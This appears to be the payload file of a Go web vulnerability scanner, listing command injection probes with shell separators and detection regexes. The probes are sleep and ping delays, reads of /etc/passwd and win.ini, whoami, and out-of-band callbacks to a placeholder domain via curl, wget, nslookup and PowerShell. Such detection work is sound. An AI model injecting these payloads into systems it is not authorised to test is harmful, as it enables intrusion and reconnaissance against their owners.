// internal/payloads/cmdinjection.go
package payloads

import "regexp"

// CommandInjectionTest represents a single command injection test case.
type CommandInjectionTest struct {
	Type            string // "output-based", "time-based"
	PayloadToInject string
	Separators      []string
	DetectionRegex  *regexp.Regexp
	Description     string
	OS              string // "unix", "windows", or "any"
	SleepSeconds    int    // Only for time-based tests
}

// OASTCommandInjectionTest contains the payload template for OAST-based tests.
type OASTCommandInjectionTest struct {
	PayloadTemplate string
	Description     string
	OS              string // NEW FIELD: "unix", "windows", or "any"
}

var CommandInjectionTests []CommandInjectionTest
var OASTCommandInjectionTests []OASTCommandInjectionTest

func init() {
	CommandInjectionTests = []CommandInjectionTest{
		// --- Time-Based Payloads ---
		{
			Type:            "time-based",
			PayloadToInject: "sleep {SLEEP_TIME}",
			Separators:      []string{";", "&&", "|", "`", "\n"},
			Description:     "Time delay using 'sleep'",
			OS:              "unix",
			SleepSeconds:    5,
		},
		{
			Type:            "time-based",
			PayloadToInject: "ping -n {SLEEP_TIME_PLUS_ONE} 127.0.0.1",
			Separators:      []string{"&", "&&", "|"},
			Description:     "Time delay using 'ping' (Windows)",
			OS:              "windows",
			SleepSeconds:    5,
		},

		// --- Output-Based Payloads ---
		{
			Type:            "output-based",
			PayloadToInject: "cat /etc/passwd",
			Separators:      []string{";", "&&", "|", "`", "\n"},
			DetectionRegex:  regexp.MustCompile(`(?m)^root:x:0:0:`),
			Description:     "Reads /etc/passwd",
			OS:              "unix",
		},
		{
			Type:            "output-based",
			PayloadToInject: "expr 24680 + 13579",
			Separators:      []string{";", "&&", "|", "`"},
			DetectionRegex:  regexp.MustCompile(`\b38259\b`),
			Description:     "Arithmetic operation execution test",
			OS:              "unix",
		},
		{
			Type:            "output-based",
			PayloadToInject: "whoami",
			Separators:      []string{";", "&&", "|", "`", "\n"},
			DetectionRegex:  regexp.MustCompile(`(?i)(root|nt authority\\system|[a-z0-9-]+\\[a-z0-9-$_]+)`),
			Description:     "Get current username",
			OS:              "any",
		},
		{
			Type:            "output-based",
			PayloadToInject: "type C:\\Windows\\win.ini",
			Separators:      []string{"&", "&&", "|"},
			DetectionRegex:  regexp.MustCompile(`(?i)\[fonts\]|\[extensions\]|\[files\]`),
			Description:     "Reads win.ini file",
			OS:              "windows",
		},
	}

	OASTCommandInjectionTests = []OASTCommandInjectionTest{
		{PayloadTemplate: `nslookup DURSGO_OAST_DOMAIN`, Description: "OAST via nslookup", OS: "any"},
		{PayloadTemplate: `curl http://DURSGO_OAST_DOMAIN`, Description: "OAST via curl", OS: "unix"},
		{PayloadTemplate: `wget http://DURSGO_OAST_DOMAIN`, Description: "OAST via wget", OS: "unix"},
		{PayloadTemplate: `ping -c 4 DURSGO_OAST_DOMAIN`, Description: "OAST via ping (Linux)", OS: "unix"},
		{PayloadTemplate: `ping -n 4 DURSGO_OAST_DOMAIN`, Description: "OAST via ping (Windows)", OS: "windows"},
		{PayloadTemplate: `powershell -c "Invoke-WebRequest -Uri http://DURSGO_OAST_DOMAIN"`, Description: "OAST via PowerShell", OS: "windows"},
	}
}
